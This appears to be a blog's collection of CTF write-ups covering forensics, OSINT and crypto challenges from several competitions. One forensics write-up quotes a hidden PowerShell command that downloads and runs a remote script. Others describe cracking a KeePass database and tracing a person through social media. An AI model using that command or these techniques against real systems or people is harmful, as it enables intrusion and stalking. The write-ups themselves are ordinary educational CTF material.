Upon entering the drive we see some text files that contain command history and other important notes.\nInside .bash_history we see:\njoplin cd .config/joplin ls -lah sqlite3 database.sqlite ls ls -lah cat database.sqlite | grep lactf cd .. cd .. ls ls -lah nano note_to_self.txt ls -lah ls zerofree /dev/mapper/notes exit Ok so we are dealing with notes being taken on Joplin, an open source note-taking app. joplin initializes the notebook and .config folder, and our hacker here then enters the database that joplin uses. We can see their edit history in the .sqlite_history file:\n.tables select * from notes; select * from *; select * from notes_fts; select * from qexit exit .exit ; exit ; .exit .tables select * from notes; delete from notes; select * from notes; ... select count(*) from notes; vacuum; .exit .exit pragma secure_delete; select * from notes_normalized; delete from notes_normalized; select * from notes_normalized; vacuum; .exit Looks like they are deleting their notes from the database, as hackers do. They nicely lay out their process in the note_to_self.txt file:\nNote to self: delete notes and notes_normalized tables in .config/joplin/database.sqlite when not in use; allow encrypted sync to restore notes after This matches up with the history files we just looked at, where the hacker is creating notes, then erasing them. Also shown by zerofree /dev/mapper/notes. Now time to figure out how to get these notes back! One of the first things I tried was just cat database.sqlite | grep -a 'lactf' in the .config folder, and we get this:\n┌──(kali㉿kali)-[/media/kali/ed1c79a8-8148-4ce2-b482-91334a211dc9/.config/joplin] └─$ cat database.sqlite | grep -a \u0026#39;lactf\u0026#39; 3ncryp71onc4ch3dinfolactf p422word2s3cur3ecert�n0 113 3ncryp71onc4ch3dinfolactf p422word2s3cur3ecertyo40 20infosec@0 26infosecert Interesting. This looks somewhat like the flag format? I tried for a while to rearrange this into something like lactf{p422word_2_s3cur3_your_3ncryp71on_c4ch3d_info}. But no flag :( wasn\u0026rsquo;t going to be this easy. After more checking I discovered this was just some residue data that comes from creating a note that the database saved, but the capitalization and punctuation is not correct. But hey! We know the flag is here assuming this isn\u0026rsquo;t bait.\nLet\u0026rsquo;s take a look at that encrypted-notes folder:\nWe see here two markdown files and info.json This json file contains encryption of the master keys. According to Joplin\u0026rsquo;s E2EE Spec the master keys are themselves encrypted.\nThe markdown files look like such:\nid: f6fdd827811741a5b8b796b7778b2f4b created_time: updated_time: 2023-01-16T01:07:30.122Z user_created_time: user_updated_time: encryption_cipher_text: JED01000022057fc1b793673943df83c6d6ef862416250002d0{\u0026#34;iv\u0026#34;:\u0026#34;EJ1h/RpLa3kHQshwbAzg/w==\u0026#34;,\u0026#34;v\u0026#34;:1,\u0026#34;iter\u0026#34;:101,\u0026#34;ks\u0026#34;:128,\u0026#34;ts\u0026#34;:64,\u0026#34;mode\u0026#34;:\u0026#34;ccm\u0026#34;,\u0026#34;adata\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;cipher\u0026#34;:\u0026#34;aes\u0026#34;,\u0026#34;salt\u0026#34;:\u0026#34;t+kHfSSLUOk=\u0026#34;,\u0026#34;ct\u0026#34;:\u0026#34;8rNT3WgTYYHbeXFvYNiebAD1Lz0lcmMBGjVoEe2vic0sTV8nzUUmP1gBVA/R7oCyOQLbcGrXc1hl1amvVE/Lln8erhqi1+tje9Amx+0tZPcwpQKiIht2hQmCqzBbCEYQ9f0OjFS01wJTTPl9M9PgIRc2eNvmN5VYCOiq3TqHOeBgiiyKFhXTd/1Xpbv++Y58M9Nombzmx3lRujjF2LAKUaYnO33BRQ7EJoadjqNE0PBNeMvZRBxsdt2Y2VmV3evWkA8htlf5R/Zhe8Di4CPupFJgBDF2j9P7R27f3UcrWzauqlLi4BfSjYggTQGe0YdxOJxHxXZIZX0KHqsTtpYXZDgnj0g4AkxDVBQhxJVQObdo/u8JUQofHLCZyyD2pn8A6cYF7QbItz3J9flQVtZw59UtLq2Oiip6OCWj75xLy48EqEtUjQsXY5AidrCR36S7fPsVilSCXBWX6x+43xArg+rMCAnColo+0XW/Beu+OHUPEkUl60pvuPcwiVo2tmR3Niiq+M2Fy+dpYfdH7pCqnIdKOJCrm/MGKGJyLYjlwYqhXwoKs32tVsNyhxFl1c3feZwCOw==\u0026#34;} encryption_applied: 1 parent_id: is_shared: share_id: master_key_id: icon: type_: 2 With the other file having the header:\nid: b692aaeaf3494fa29121524802940dc2 parent_id: f6fdd827811741a5b8b796b7778b2f4b As well as a similar body. This indicates that this file likely is a note as part of the parent notebook.\nI first tried to decrypt this with this SJCL demo that\u0026rsquo;s the same scheme Joplin uses, as per the spec.\nBut what password do we use to decrypt these encrypted notes? That comes to the second part of the challenge description, where there\u0026rsquo;s a much stronger encryption password once you login. Well the master password is actually stored in cleartext in the database file!\nI tried using variations of this and the password found in info.json (which is also in syncInfoCache in the database) on the SJCL demo website, but to no avail. This is probably possible, but why make this harder than it needs to be? Let\u0026rsquo;s just download our own version of Joplin and replace the database file! Swapping out important parameter values should also work, like the syncInfoCache, encryption.masterPassword, and sync_items.\nOnce you\u0026rsquo;re in Joplin make sure the Encryption Keys look as such:\nThen, make sure the Synchronization target is on the file system and pointed to the encrypted-notes folder, or a copy of it.\nAfter all this is done, select the Delete local data and re-download from sync target to sync the new data into Joplin!\nThere we go! We can see the secert info that the hacker was keeping from us.\nFlag: lactf{S3cUr3_yOUR_C4cH3D_3nCRYP71On_P422woRD2}\nThoughts #This challenge was a good one, and took up a lot of my time this CTF.

The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?\nApproach #We are given a .vhdx file, which contains a Windows Image. To open in Autopsy, I double clicked the file on my Windows machine and imported that disk image. The first thing that struck my eye when doing this was the email saved onto the machine.\nThe email HTML gives us the password Privacy4411@2023!!!. This can be used to open the attachment in the email, which gives us a file Policy.xlsx. In this file my teammates and I tried to find anything meaningful, even performing stego on the image of Tommy Xiaomi but with no success. I noticed a weird line on page 3, which was hidden, but it did not show correct output on google sheets since the file was converted. However, doubledelete was able to view the line\nCMD.EXE /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\u0026#34;http://172.21.20.96/windowsupdate.ps1\\\u0026#34;);IEX $e This can also be viewed on any.run when importing the file\nThis malicious command seems to have downloaded a file called windowsupdate.ps1.

I found one on Instagram, but it seemed unrelated to the competition. I went back to the prompt to see what other clues could lead us to this account. I decided to google “forbidden app” and found urban dictionary definitions that this app is iFunny, and the definitions also mentioned being “part of the ship” (like the challenge name) so I figured this was the right social media.\nLooking at DanFlashes on iFunny, we see that this page does not exist. However, the challenge description states that this was “‘way back’ in the day” which hints that we should use the Wayback Machine (always look for hints like these in OSINT challenges!). From this we can see a snapshot was taken January 28th of this year, which gives us the flag on DanFlashes\u0026rsquo; profile.\nflag: sdctf{morning_noon_and_night_I_meme}\nGoogle Ransom #Difficulty: Easy\nAuthors: KNOXDEV\nPoints: 100\nSolves: 155\nChallenge Description:\nOh no!

I initially thought this was an Aviation OSINT since the plane in the background was the only other thing in the video.

I then realized the blinking beacon was likely morse code. .-- .... .- - / .... .- - .... / --. --- -.. / .-- .-. --- ..- --. .... - translated to WHAT HATH GOD WROUGHT. After googling what that means, we learn it was the official first Morse code message transmitted in the US.\nI thought then the location may be where the message was originally transferred or received, but couldn’t find anything there. I then just searched “What hath god wrought” on Google Maps and found a sculpture at the University of California San Diego. Seeing that the competition is hosted by San Diego State University, I assumed this was the right spot.

We can use epieos on Jack’s email to find his name is Jack Banner.\nNext we are prompted with “What month were you born in?” I wasn\u0026rsquo;t sure if you were supposed to brute force this but figured since it was an OSINT challenge thre would be a social media account. Epieos showed Jack’s email as being connected to a Twitter, but luckily the challenge admin noticed this as well and added a disclaimer that twitter does not need to be used. What could have happened is someone else registered an account with that email, which admins have to be prepared to fix for these kinds of challenges. I tried other social media platforms, and specifically ones that I did not explore yet. OSINT categories usually try to avoid using the same platform twice. Looking up “Jack Banner” on Facebook, we see the account we are looking for.\nThe first post we can use to find his birthday by a quick google search of “99 days before april 19” giving us their birthday of January 10th.\nThe next prompt is “What is the name of your dog?” Looking around more on their facebook, we see an instagram for their dog linked in the Intro section. Something I learned from this challenge is that this can only be seen if you are logged into Facebook, so for some OSINT challenges you may need to be logged in. Although for regular OSINT gathering usually you don’t want to alert the person you are looking at, such as on LinkedIn. On the Instagram account we see that the dog’s name is Ravioli.\nThe final prompt is “What are the first six characters of your flag?” which is sdctf{ for this CTF.

When searching for limosheen on PayPal, we can see that there exists an account with the SDCTF logo. The challenge description said \u0026ldquo;You should not have to spend any money to solve this challenge\u0026rdquo;, although some people still sent the account money but received nothing :(. After some research I learned about paypal.me accounts which give more information about a user. Going to limosheen’s profile, we find this:\nI saw a string on this that started with 0x and incorrectly thought it was a hex string by default, and decoding it gave nothing. I eventually learned it was an Ethereum address by just googling and inputting the address into crypto websites. In hindsight I should have definitely realized this sooner with the plaintext saying we can also find them on the blockchain, and the ropETH comment on the PayPal. When looking up the address on Etherscan we find that the address is valid, but no entries are found.\nI thought that this was a dead end at first and started doing reverse image searches and forensics on the PayPal banner, but did not get any results. I looked back at the Ethereum address and figured there must be a reason that it’s there. On Etherscan there is a notification saying that the address can be found on other chains, and sure enough we see that it’s on the Ropsten Testnet.\nI tried googling the “ropETH” hint from the PayPal prior but must have done so poorly since I could not find Ropsten Testnet, but it at least confirmed we were in the right place now. We see Ethereum was transferred to 0x949213139D202115c8b878E8Af1F1D8949459f3f, and this address has only inbound transfers, so it can be assumed that this is the boss we are looking for.\nThe PayPal account said we could find the boss on Twitter, so I put this address into twitter and found the account Jon Fakeflag.\nFrom this account we get a base64 string that gives us the flag.\nflag: sdctf{You_Ever_Dance_With_the_Devil_In_the_Pale_Moonlight}\nMann Hunt #Difficulty: Hard\nAuthors: KNOXDEV\nPoints: 400\nSolves: 96\nChallenge Description:\nWe were on the trail of a notorious hacker earlier this week, but they suddenly went dark, taking down all of their internet presence\u0026hellip;All we have is a username.

I went to the website linked on Twitter where we find this message stating that we will never find this user.\nWayback Machine does not prove to be useful here either, so I looked at the source code of the website and found a link to a GitHub repository for the website.\n…name=\u0026#34;description\u0026#34; content=\u0026#34;Contribute to the blog at https://github.com/manncyber/manncodes.github.io\u0026#34;/\u0026gt;\u0026lt;meta data-react-helmet=\u0026#34;true\u0026#34; property=\u0026#34;og:title\u0026#34;... In this repository we can see a commit that manncyber made removing certain data because he was being tracked. My first thought was maybe they used their email in this commit, so I added .patch to the end of the commit url but they used a standard GitHub email for this.\nHere is where I started overthinking the challenge and tried a couple of dead end routes. I saw an image called salty_egg was removed in this commit, and when reverse image searvching it I was lead to this Wikipedia article. I spent a long time looking through the editing history profiles and IPs before realizing the image was a stock template for Gatsby.\nIn this commit history we can also see that the blog author’s name Emanuel Hunt was removed. I initially looked on epieos to see if emmanuel.sdctf@gmail.com or hunt.sdctf@gmail.com were valid emails, but they were not. I finally just googled “Emanuel Hunt” (which I should have done initially) and was immediatley shown a search result for an Emanuel Hunt from San Diego on LinkedIn.\nIf we go to the resume that is linked, the email is unfortunately blanked out. However, if we hover over Emanuel Hunt’s profile picture on the right hand side the email mann.sdctf@gmail.com is shown.\nThis email is fairly simple to guess and some people may have done that initially. Sending them an email demanding the flag we get this response:\nflag:sdctf{MaNN_tH@t_w@s_Ann0YinG}\n","date":"10 May 2022","permalink":"/posts/sd-ctf-2022/","section":"Posts","summary":"\u003cp\u003eUniversity of San Diego\u0026rsquo;s CTF!

Great news! You got an interview with a small cybersecurity company; the Keeber Security Group. Before interviewing, they want to test your skills through a series of challenges oriented around investigating the Keeber Security Group.\nThe first step in your investigation is to find more information about the company itself. All we know is that the company is named Keeber Security Group and they are a cybersecurity startup. To start, help us find the person who registered their domain. The flag is in regular format.\nApproach #Starting off we get this prompt that the Keeber Security Group about them wanting us to perform an investigation on them using our OSINT knowledge. We see that someone registered a domain, so step 1 should be finding this website. Not too hard after a quick google search for Keeber Security Group.\nWe can use external websites to find out who registered the domain, such as whois.com.\nflag: flag{ef67b2243b195eba43c7dc797b75d75b}\nKeeber 2 #Points: 50\nSolves: 890\nChallenge Description: The Keeber Security Group is a new startup in its infant stages. The team is always changing and some people have left the company. The Keeber Security Group has been quick with changing their website to reflect these changes, but there must be some way to find ex-employees. Find an ex-employee through the group\u0026rsquo;s website. The flag is in regular format.\nApproach #I started off looking at the Github for this one, and found a contributor named Tiffany Douglas who wasn’t on the team section of the website. However, I couldn\u0026rsquo;t find the flag there. I then pivoted to the Wayback Machine and noticed a snapshot was taken prior to the competition starting.\nLooking at this, we can find the flag under Tiffany\u0026rsquo;s name in the team section.\nflag: flag{cddb59d78a6d50905340a62852e315c9}\nKeeber 3 #Points: 50\nSolves: 377\nChallenge Description: The ex-employee you found was fired for \u0026ldquo;committing a secret to public github repositories\u0026rdquo;.

Under the .gitignore in security-evaluation-workflow we see a secret that Tiffany must have added by mistake.\nI wasn’t sure what asana was at first, but after googling it seems that it’s some software that Keeber uses. I went to the asana documentation to see what we could do with this and came across a way to access the api:\ncurl https://app.asana.com/api/1.0/users/me \\ -H \u0026#34;Authorization: Bearer 0/a7f89e98g007e0s07da763a\u0026#34; Replacing the string with the one in the github, we get the flag.\nflag: flag{49305a2a9dcc503cb2b1fdeef8a7ac04}\nKeeber 4 #Points: 318\nSolves: 192\nChallenge Description: The ex-employee also left the company password database exposed to the public through GitHub. Since the password is shared throughout the company, it must be easy for employees to remember. The password used to encrypt the database is a single lowercase word somehow relating to the company. Make a custom word list using the Keeber Security Groups public facing information, and use it to open the password database The flag is in regular format.\n(Hint: John the Ripper may have support for cracking .kdbx password hashes!)\nApproach #Finding the password database wasn\u0026rsquo;t hard, as it\u0026rsquo;s under password-manager in the github. After some research, we find that the .kdbx extension is a Keepass database hash. Following the steps in this github we can crack this keepass using John the Ripper and Hashcat together. With keepass2john in John the Ripper we can get a hash file that is readable by hashcat. You must remove the file name from the start of the hash file by editing it or with | grep -o \u0026quot;$keepass$.*\u0026quot;.\nThe hardest part for me in this challenge was creating a good word list to use. I initially used CeWL to compile a list of words on the website and github, then turned them to lowercase and removed duplicates. The correct password was in here, but the wordlist was 30k+ words and hashcat would not have finished in time.\nI looked closer at the security-evaluation-workflow in the github and found a lot of strange words that did not exist like in “We strive to achieve minivivi and clainebookahl through this”. I figured one of these made up words would be the password, and compiled a wordlist of the 72 of them. Using hashcat, we get the password is craccurrelss in 4 mins, 35 seconds.\nUsing Keepass, we can open the .kdbx file with craccurrelss and get access to the passwords. After messing around for a bit I found that performing auto-type on an entry outputs the flag.\nflag: flag{9a59bc85ebf02d5694d4b517143efba6}\nKeeber 5 #Points: 50\nSolves: 573\nChallenge Description: The ex-employee in focus made other mistakes while using the company\u0026rsquo;s GitHub. All employees were supposed to commit code using the keeber-@protonmail.com email assigned to them. They made some commits without following this practice. Find the personal email of this employee through GitHub. The flag is in regular format.\nApproach #The challenge description tells us that we should look in the company’s GitHub to find the email of Tiffany. My initial thought is that she may have made a commit on another public GitHub repo. However, the Keeber repository is the only public one she has made commits to.\nI then did some research to see if there was a way to get the email of an account through GitHub and came across this article. Following these steps, I went through each of Tiffany’s commits in the GitHub repo adding .patch to all of the urls. Eventually, we get to this commit and get the following output when adding .patch:\nFrom b25ed7f5aa72f88c0145a3832012546360c2ffc2 Mon Sep 17 00:00:00 2001 From: flag{2c90416c24a91a9e1eb18168697e8ff5} \u0026lt;tif.hearts.science@gmail.com\u0026gt; Date: Wed, 20 Apr 2022 22:46:09 -0400 Subject: [PATCH] started code_reviews.txt --- code_reviews.txt | 16 ++++++++++++++++ 1 file changed, 16 insertions(+) ... flag: flag{2c90416c24a91a9e1eb18168697e8ff5}\nKeeber 6 #Points: 368\nSolves: 164\nChallenge Description: After all of the damage the ex-employee\u0026rsquo;s mistakes caused to the company, the Keeber Security Group is suing them for negligence! In order to file a proper lawsuit, we need to know where they are so someone can go and serve them. Can you find the ex-employee’s new workplace? The flag is in regular format, and can be found in a recent yelp review of their new workplace.\n(Hint: You will need to pivot off of the email found in the past challenge!)\nApproach #The hint tells us that we need to use tif.hearts.science@gmail.com to eventually find this new workplace. I tried to use epieos to get more information. This only gives us her name and that she has a GitHub account, which we already knew. Since we are trying to find their new workplace, I figured they may have a social media account that would allow us to find this place (similar to a recent OSINT I made for WolvSecCon). Linkedin produced no results, and I thought Instagram was not either. None of the Tiffany Douglas accounts on instagram seemed to be her, but searching tif.hearts.science we find an account that is hers.\nI started with this first post to find her work location. We can see a Google watermark on it, so I set out to find where this could be on Google Maps. On Tiffany\u0026rsquo;s GitHub profile, she states that she is from Maine. This can also be deduced from the 207 area code on Keeber\u0026rsquo;s website. Searching on the coast of Google Maps, we can easily see ferry routes denoted by blue dashed lines. I eliminated the minor cities in Maine and figured it must be Portland, which would also be why she called it “the city.”\nAfter scanning these ports I eventually came across this one that looked like the image, and sure enough if we turn the date back to 2015 we see the same image that was on her instagram.\nFrom her first instagram post I see that there is a courtyard at the place she works at, so I start scanning for courtyards in Portland on Google Maps to see if any of them had similar photospheres. This was not getting me anywhere, so I looked more at her Instagram and figured she works at a hotel from the “but the pool is indoors” meme. In hindsight, the bedding Instagram posts were also indications of this. I searched for hotels in Portland and found one with a courtyard in satellite mode.\nSearching this hotel on yelp, we find Tiffany’s review with the flag in it.\nflag: flag{0d707179f4c993c5eb3ba9becfb046034}\nKeeber 7 #Points: 474\nSolves: 74\nChallenge Description: Multiple employees have gotten strange phishing emails from the same phishing scheme.

Beiber did not trick them. However, they did leave their email cheerios.fanatic1941@gmail.com which we may be able to use to figure out whoever sent this.\nI thought about doing forensics work on the pdf, but since this was an OSINT challenge and the description said use the email I didn’t bother doing anything past looking at the metadata, to which there was nothing. The note saying we did not need to pay for any OSINT tool hinted that we should be able to use a public one, so I went back to epieos. This gave us the information that this gmail is registered with the name Issac Anderson and with holehe we know that they have a Myspace account created with this email.\nI looked for a while to see if there was a way to find a Myspace account with just an email, but could not find anything. I then searched for Issac Anderson on Myspace and checked the ones that showed up but did not see a flag. I thought for a bit that maybe holehe was wrong or someone else registered an account with that email, but looking at the pdf again I figured the mention of Justin Bieber was a hint that we should in fact be looking for a Myspace account, since people like to share music there. I then realized I did not look through all the Issac Andersons, of which many, many results showed up.\nI went through opening all of them and quickly looked through to see if I found the right one. Sure enough, the flag showed up on one of them.\nflag: flag{4a7e2fcd7f85a315a3914197c8a20f0d}\nKeeber 8 #Points: 482\nSolves: 62\nChallenge Description: Despite all of the time we spend teaching people about phishing, someone at Keeber fell for one!

The Sherlock tool is great for finding accounts connected to usernames.\nA lot of the results that showed up like CapFriendly show up for most searches but don’t actually have an account linked to that username.

This means something is broken with the algorithm. We can see that the encryption script is choosing primes that are divisible by the second power of e, meaning phi is not coprime to e!. This will cause a decryption using the inverse mod of the ciphertext to not be useful.\nTherefore, we have to use a solution similar to Dice CTF\u0026rsquo;s where we take all candidate decryptions using the nth root algorithm in sage.\nStep 1: We need all p and q values of the Ns. This can take a long time to generate since the largest N is 199 digits long. To accommodate for this, I uploaded the factors to FactorDB. An algorithm that fetches the primes from factor DB can be used, or just manually doing it since there are only 27 Ns to factor.\nStep 2: We are given the encrypted ciphertext after 27 encryptions, so we have to start by using the largest N\u0026rsquo;s p and q values and the nth root algorithm to get possible p and q roots. We use the Chinese remainder theorem with the p and q roots to give us possible candidate decryptions, for which there will be e^2 of (12769 in this case).\nStep 3: We are then going to have to construct an algorithm to keep recursing through the possible candidate decryptions, using the correct p and q values based on the depth of the recursion. A depth first search (DFS) is most useful here to get the flag quicker. Using OPz qt\u0026rsquo;s DFS Sage Script we can get the flag!\nfrom Crypto.Util.number import long_to_bytes from sage.all import * e = 113 cipher =

Since the encryption added 9 more bits to the minimum size p and q could be bitLength = ((len(bin(numToEncrypt)) - 2) // 2) + 9, this means we don\u0026rsquo;t have to DFS through 12769 candidate decryptions each time but actually just a couple or even sometimes 1! The algorithm below gets all candidate decryptions, and only chooses the smallest one for ciphers \u0026gt; 400 bits, smallest 5 for ciphers \u0026gt; 350 bits and smallest 10 for the rest. This will save about a minute\u0026rsquo;s time (on my machine) when trying to find the flag.\nfrom Crypto.Util.number import long_to_bytes from sage.all import * e = 113 cipher =

to people with very great computing power to be able to still use the sole DFS algorithm without the e optimization. Therefore, the optimization is just a bonus idea. It is most useful when trying to replicate the results of the challenge. Sage remembers factors, so when running the scripts a second time the non-optimized one takes a minute whereas the optimized one takes 5 seconds on my machine. Maybe someone could force this optimization in a challenge of their own! If 10 bits were added instead of 9 then we would not even need a DFS, and could do it linear with the smallest candidate decryption each time. However, the idea for this challenge was to incorporate a DFS but to be able to use the optimization as assistance.\nNoise #Category: Forensics\nDifficulty: Medium\nPoints: 498\nSolves: 18\nChallenge Description: My buddy sent me this totally RAW clip of them playing guitar. Doesn’t sound quite right to me, something might be off. Also don’t listen with headphones at the end!\nApproach #This challenge was based off of Joshua Casper\u0026rsquo;s steganography idea!\nWhile listening to the audio file, you can hear the audio has gotten corrupted towards the end of the recording.\nIf you run strings on the file, it will output hidden comments:\nThis is hinting that you will need to view this as a raw file in photoshop. This is also hinted in the description with RAW being capitalized. To convert it to a raw file, change the file extension from \u0026ldquo;.wav\u0026rdquo; to \u0026ldquo;.raw\u0026rdquo;. Then, when trying to open the file in photoshop you are presented with the following options:\nFrom the hint, we are given that the channels should be set to 1 and the depth should be set to 8 bits. These are also the default settings, so the hint was not necessarily needed.\nflag: wsc{t0t4lly_w1ck3d_dud3}\nNote #At least one team was able to do this without the use of photoshop, and just online tools.\nWhere in the world? #Category: OSINT\nDifficulty: Medium\nPoints: 486\nSolves: 39\nChallenge Description: User Vividpineconepig claims on to live next to a street that\u0026rsquo;s above some train tracks. Where are they? Maybe finding their social media could help. We’ll give you a flag for tracking them down. Give us this elevated STREETNAME preceding the St/Rd/Ave/Lane to prove it.\nFormat: wsc{STREETNAME}\nApproach #Vividpineconepig appears to be the name of some unique user. The description tells us we might want to find their social media account. Using tools like Sherlock we can find possible social media accounts of unique users. Once we try instagram, we find the following account and picture:\nOne might initially think that we are going to need to brute force search the location, but we can actually narrow down this location using the two main clues in the picture. After doing research, one would find that the Adopt a Highway sign on the right is exclusive to the state on Montana. The other major clue is the Mile 280 mile marker. Since we know the state is Montana, one might find this Montana\u0026rsquo;s DOT Mile Marker map to be useful. There are now very little locations you would have to check on programs such as google maps.\nOnce we find that the town is Shelby, MT, the next step is finding the streetname. From the picture, we might consider this elevated street over the traintracks to be the street the description is referring to.\nLooking on google maps, we can find the most updated street name (NOTE: If you check on google street view, it will give you an older name of the street, which is incorrect):\nHere, we can see the street is Oilfield Ave.\nflag: wsc{OILFIELD}\nShoutout to the USA Geoguessr community! would not have all adopt a highway signs memorized without them :)\n","date":"29 March 2022","permalink":"/posts/wolvsec-ctf-2022/","section":"Posts","summary":"\u003cp\u003eAuthor writeups for my 4 challenges in Crypto, Forensics, and OSINT\u003c/p\u003e","title":"WolvSec CTF 2022"},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"}]
